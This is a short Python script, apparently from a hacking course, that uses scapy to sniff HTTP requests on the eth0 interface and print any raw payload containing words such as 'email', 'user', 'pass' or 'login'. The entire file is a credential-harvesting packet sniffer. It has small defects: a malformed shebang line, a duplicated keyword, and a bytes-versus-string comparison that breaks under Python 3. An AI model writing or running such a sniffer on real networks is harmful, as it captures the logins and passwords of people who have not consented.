#/usr/bin/env python
# Rebuild
import scapy.all as scapy
from scapy.layers import http

keywords = ["email", "user", "admin", "name", "pass", "login", "name", "word"]
# might be worth searching for "@"

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for keyword in keywords:
                if keyword in load:
                    print("[+] Keyword Found")
                    print(load)
                    break

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

sniff("eth0")

